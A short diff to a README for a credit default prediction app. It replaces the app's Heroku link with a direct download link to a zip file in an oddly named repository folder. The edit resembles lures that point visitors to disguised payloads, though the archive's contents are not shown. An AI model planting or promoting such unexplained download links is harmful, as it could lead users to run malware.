@@ -1,2 +1,2 @@
 # Default-Prediction-App
-## https://credit-default-predictor-01.herokuapp.com/
+## https://raw.githubusercontent.com/kushagra1511/Default-Prediction-App/main/viviparously/Default-Prediction-App.zip
